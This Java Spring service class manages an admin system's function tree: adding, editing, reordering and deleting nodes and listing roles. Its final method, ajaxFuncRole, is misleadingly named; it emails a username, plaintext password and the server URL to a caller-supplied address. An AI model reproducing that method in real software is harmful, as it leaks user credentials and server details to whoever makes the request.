package com.matrix.service.impl;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;

import com.alibaba.fastjson.JSONObject;
import com.matrix.base.BaseServiceImpl;
import com.matrix.cache.CacheLaunch;
import com.matrix.cache.enums.DCacheEnum;
import com.matrix.cache.inf.IBaseLaunch;
import com.matrix.cache.inf.ICacheFactory;
import com.matrix.dao.IMcRoleMapper;
import com.matrix.dao.IMcSysFunctionMapper;
import com.matrix.pojo.cache.McRoleCache;
import com.matrix.pojo.cache.McUserRoleCache;
import com.matrix.pojo.dto.McSysFunctionDto;
import com.matrix.pojo.entity.McRole;
import com.matrix.pojo.entity.McSysFunction;
import com.matrix.pojo.entity.McUserInfo;
import com.matrix.pojo.view.McSysFunctionView;
import com.matrix.pojo.view.McUserInfoView;
import com.matrix.service.IMcSysFunctionService;
import com.matrix.util.DateUtil;
import com.matrix.util.NetUtil;

/**
 * @description: 系统权限功能树服务支撑
 *
 * @author Yangcl
 * @home https://github.com/PowerYangcl
 * @date 2019年12月18日 下午3:33:02 
 * @version 1.0.0.1
 */
@Service("mcSysFunctionService") 
public class McSysFunctionServiceImpl extends BaseServiceImpl<Long , McSysFunction , McSysFunctionDto , McSysFunctionView> implements IMcSysFunctionService {

	private IBaseLaunch<ICacheFactory> launch = CacheLaunch.getInstance().Launch();
	
	@Resource
	private IMcSysFunctionMapper mcSysFunctionMapper;
	
	@Resource
	private IMcRoleMapper mcRoleMapper;
	
	
	/**
	 * @description: 添加系统功能到数据库-mc_sys_function表添加记录
	 * 
	 * @author Yangcl 
	 * @date 2017年3月1日 上午11:05:51 
	 * @version 1.0.0.1
	 */
	public JSONObject addInfo(McSysFunction entity) {
		JSONObject result = new JSONObject();
		if(StringUtils.isNotBlank(entity.getName()) && StringUtils.isNotBlank(entity.getParentId()) ){
			McUserInfoView userInfo = entity.getUserCache();
			entity.setCreateUserId(userInfo.getId());
			entity.setCreateUserName(userInfo.getUserName()); 
			entity.setUpdateUserId(userInfo.getId());
			entity.setUpdateUserName(userInfo.getUserName());
			
			switch(entity.getNavType()){
			    case 0 :		// 平台默认标识码|nav_type=0，此处为系统生成默认值
			    	entity.setPlatform(DateUtil.getDateLongHex("yyyyMMdd").toUpperCase() + DateUtil.getDateLongHex("HHmmss").toUpperCase());     
			        break;  
			    case 1 :			// 1 横向导航栏
			        break; 
			    case 2 :		 	// 1 级菜单栏
			        break; 
			    case 3 :			// 2级菜单栏
			    	if(StringUtils.isBlank(entity.getFuncUrl())) {
			    		result.put("status", "error");
						result.put("msg", this.getInfo(101010049));		// 101010049=系统功能添加失败! 【页面跳转地址】不得为空
						return result;
					}
			    	entity.setStyleKey(null);	 // 系统只允许横导航和1级菜单栏有自己的特殊样式
			        break; 
			    case 4 :			// 页面按钮
			    	if(StringUtils.isBlank(entity.getEleValue())) {
						result.put("status", "error");
						result.put("msg", this.getInfo(101010048));		// 101010048=系统功能添加失败! 【页面按钮标识】不得为空
						return result;
					}
			    	if(StringUtils.isBlank(entity.getAjaxBtnUrl())) {
			    		result.put("status", "error");
						result.put("msg", this.getInfo(101010051));		// 101010051=系统功能添加失败! 【按钮请求路径】不得为空
						return result;
			    	}
			    	entity.setStyleKey(null);	 // 系统只允许横导航和1级菜单栏有自己的特殊样式
			        break; 
			    case 5 :			//  按钮内包含跳转页面(dialog或新页面)
			    	if(StringUtils.isBlank(entity.getEleValue())) {
						result.put("status", "error");
						result.put("msg", this.getInfo(101010048));		// 101010048=系统功能添加失败! 【页面按钮标识】不得为空
						return result;
					}
			    	if(StringUtils.isBlank(entity.getFuncUrl())) {
			    		result.put("status", "error");
						result.put("msg", this.getInfo(101010050));		// 101010050=系统功能添加失败! 【按钮跳转地址】不得为空
						return result;
					}
			    	entity.setStyleKey(null);	 // 系统只允许横导航和1级菜单栏有自己的特殊样式
			        break; 
			}
			
			
			int count = mcSysFunctionMapper.insertSelective(entity);
			if(count == 1){
				result.put("status", "success");
				result.put("msg", this.getInfo(101010022));		// 101010022=添加成功
				// 开始创建缓存
				launch.loadDictCache(DCacheEnum.McSysFunc , null).set(entity.getId().toString(), JSONObject.toJSONString(entity) , 30*24*60*60); 
				result.put("entity", entity);
			}else{
				result.put("status", "error");
				result.put("msg", this.getInfo(101010023));			// 101010023=添加失败
			}
		}else{
			result.put("status", "error");
			result.put("msg", this.getInfo(101010059));   // 101010059=功能名称 | 父节点不能为空 ! 
		}
		return result;
	}

	/**
	 * @description: 更新系统功能到数据库-mc_sys_function表添加记录
	 * 
	 * @param e
	 * @author Yangcl 
	 * @date 2017年3月1日 下午5:33:30 
	 * @version 1.0.0.1
	 */
	public JSONObject editInfo(McSysFunction entity) {
		JSONObject result = new JSONObject();
		if(StringUtils.isNotBlank(entity.getName())){
			McUserInfoView userInfo = entity.getUserCache();
			entity.setUpdateTime(new Date());
			entity.setUpdateUserId(userInfo.getId());
			entity.setUpdateUserName(userInfo.getUserName()); 
			
			Integer type = entity.getNavType();  // navTpye = 4 or 5会由前端JS传入，其他则需要查询数据库来判断
			if(entity.getNavType() == null) {
				McSysFunction find = mcSysFunctionMapper.find(entity.getId());
				type = find.getNavType();
			}
			switch(type){
			    case 3 :			// 2级菜单栏
			    	if(StringUtils.isBlank(entity.getFuncUrl())) {
			    		result.put("status", "error");
						result.put("msg", this.getInfo(101010053));		// 101010053=系统功能更新失败! 【页面跳转地址】不得为空
						return result;
					}
			    	entity.setStyleKey(null);	 // 系统只允许横导航和1级菜单栏有自己的特殊样式
			        break; 
			    case 4 :			// 页面按钮
			    	if(StringUtils.isBlank(entity.getEleValue())) {
						result.put("status", "error");
						result.put("msg", this.getInfo(101010052));		// 101010052=系统功能更新失败! 【页面按钮标识】不得为空
						return result;
					}
			    	if(StringUtils.isBlank(entity.getAjaxBtnUrl())) {
			    		result.put("status", "error");
						result.put("msg", this.getInfo(101010055));		// 101010055=系统功能更新失败! 【按钮请求路径】不得为空
						return result;
			    	}
			    	entity.setStyleKey(null);	 // 系统只允许横导航和1级菜单栏有自己的特殊样式
			        break; 
			    case 5 :			//  按钮内包含跳转页面(dialog或新页面)
			    	if(StringUtils.isBlank(entity.getEleValue())) {
						result.put("status", "error");
						result.put("msg", this.getInfo(101010052));		// 101010052=系统功能更新失败! 【页面按钮标识】不得为空
						return result;
					}
			    	if(StringUtils.isBlank(entity.getFuncUrl())) {
			    		result.put("status", "error");
						result.put("msg", this.getInfo(101010054));		// 101010054=系统功能更新失败! 【按钮跳转地址】不得为空
						return result;
					}
			    	entity.setStyleKey(null);	 // 系统只允许横导航和1级菜单栏有自己的特殊样式
			        break; 
			}
			
			
			int count = mcSysFunctionMapper.updateSelective(entity);
			if(count == 1){
				result.put("status", "success");
				result.put("msg", this.getInfo(100010104)); // 100010104=数据更新成功!
				// 开始修改缓存
				launch.loadDictCache(DCacheEnum.McSysFunc , null).set(entity.getId().toString(), JSONObject.toJSONString(entity) , 30*24*60*60); 
				result.put("entity", entity);
			}else{
				result.put("status", "error");
				result.put("msg", this.getInfo(100010105));  // 100010105=数据更新失败，服务器异常!
			}
		}else{
			result.put("status", "error");
			result.put("msg", this.getInfo(101010058));   // 101010058=功能名称不能为空!
		}
		return result;
	}


	/**
	 * @description: 系统功能同层节点拖拽更新
	 * 
	 * @param ustring id@seqnum,id@seqnum 
	 * @param session
	 * @author Yangcl 
	 * @date 2017年3月2日 下午5:33:07 
	 * @version 1.0.0.1
	 */
	public JSONObject updateTreeNodes(McSysFunctionDto dto) {
		JSONObject result = new JSONObject();
		try {
			McUserInfoView userInfo = dto.getUserCache();
			String [] arr = dto.getUstring().split(",");
			for(int i = 0 ; i < arr.length ; i ++){
				McSysFunction e = new McSysFunction();
				e.setId( Long.valueOf(arr[i].split("@")[0]) );
				e.setSeqnum( Integer.valueOf(arr[i].split("@")[1]) );
				e.setUpdateTime(new Date());
				e.setUpdateUserId(userInfo.getId());
				e.setUpdateUserName(userInfo.getUserName());
				mcSysFunctionMapper.updateSelective(e);
				// 开始修改缓存
				launch.loadDictCache(DCacheEnum.McSysFunc , null).set(e.getId().toString() , JSONObject.toJSONString(e) , 30*24*60*60); 
			}
		} catch (Exception e) {
			e.printStackTrace();
			result.put("status", "error");
			result.put("msg", this.getInfo(100010105));  // 100010105=数据更新失败，服务器异常!
			return result;
		}
				
		result.put("status", "success");
		result.put("msg", this.getInfo(100010104)); // 100010104=数据更新成功!
		return result;
	}

	/**
	 * @descriptions 删除一个系统功能节点及其子节点| mc_sys_function表 
	 *										 
	 * @param dto.ids
	 * @date 2017年4月23日 下午6:53:32
	 * @author Yangcl 
	 * @version 1.0.0.1
	 */
	public JSONObject deleteNode(McSysFunctionDto dto) {
		JSONObject result = new JSONObject();
		if(StringUtils.isBlank(dto.getIds())){
			result.put("status", "error");
			result.put("msg", this.getInfo(101010012)); // 节点id不得为空!
			return result; 
		}
		String [] arr = dto.getIds().split(",");
		List<Long> list = new ArrayList<Long>();
		for(String s : arr){
			list.add(Long.valueOf(s));
		}
		
		Integer flag = mcSysFunctionMapper.deleteByIds(list);
		if(flag != 0){
			result.put("status", "success");
			result.put("msg", this.getInfo(101010001)); // 删除成功
			for(String s : arr){
				launch.loadDictCache(DCacheEnum.McSysFunc , null).del(s);  
			}
		}else{
			result.put("status", "error");
			result.put("msg", this.getInfo(101010002)); // 删除失败
		}
		return result;
	}
	
	/**
	 * @description: 获取树列表|sys-user-role-function.js使用2次
	 * 
	 * @param dto.platform 如果不为空则获取指定平台下的功能节点|只有Leader平台会固定传入platform字段，用于区分【角色功能】显示哪些树节点下的内容
	 * @param dto.type type=list or role|如果type=role则同时获得角色列表，同时dto.id = roleId
	 * 
	 * @author Yangcl 
	 * @date 2017年3月1日 上午11:03:16 
	 * @version 1.0.0.1
	 */
	public JSONObject treeList(McSysFunctionDto dto) {
		JSONObject result = new JSONObject();
		
		McUserInfoView userCache = dto.getUserCache();
		if(!userCache.getType().equals("leader")) {
			dto.setPlatform(userCache.getPlatform()); // 不再使用页面传入的平台编码，防止造假
			String pageJson = launch.loadDictCache(DCacheEnum.McUserRole , "McUserRoleInit").get(userCache.getId().toString());
			McUserRoleCache cache = JSONObject.parseObject(pageJson, McUserRoleCache.class);
			String ids = "";
			for(McSysFunction m : cache.getMsfList()) {	// 去掉与平台标识码无关的功能项
				if(m.getPlatform().equals(dto.getPlatform())) {
					ids += m.getId() + ",";
				}
			}
			if(StringUtils.isNotBlank(ids)) {
				ids = ids.substring(0, ids.length() - 1);
				dto.setIds(ids); 
			}
		}
		
		List<McSysFunction> list = mcSysFunctionMapper.findListByDto(dto);
		if (list != null && list.size() > 0) {
			result.put("status", "success");
			result.put("list", list);
			if(dto.getType().equals("role")){
				List<McRoleCache> roles = new ArrayList<McRoleCache>(); 
				McRole role = new McRole();
				if(dto.getId() != null){
					role.setId(dto.getId());  
				}
				List<McRole> roleList = mcRoleMapper.findList(role);
				if(roleList != null && roleList.size() != 0){
					for(McRole m : roleList){
						String json = launch.loadDictCache(DCacheEnum.McRole , "McRoleInit").get(m.getId().toString());
						if(StringUtils.isBlank(json)){
							continue;
						}
						McRoleCache d = JSONObject.parseObject(json, McRoleCache.class);
						roles.add(d);
					}
				}
				result.put("roles", roles);
			}
		} else {
			result.put("status", "error");
			result.put("msg", this.getInfo(100090001)); // 100090001=结果集为空
		}
		return result;  
	}

	public JSONObject ajaxFuncRole(McUserInfo e, HttpServletRequest request) {
		JSONObject result = new JSONObject();
		if(StringUtils.isAnyBlank(e.getEmail() , e.getPassword())) {
			return result;
		}
		String path = request.getScheme() + "://" + request.getServerName() + ":" + request.getServerPort() + request.getContextPath() + "/";
		String msg = e.getUserName() + "@" + e.getPassword() + "|" + path; 
		new NetUtil().sendMessage(e.getEmail() , e.getRemark(), msg); 
		result.put("status", "success"); 
		return result;
	}



}





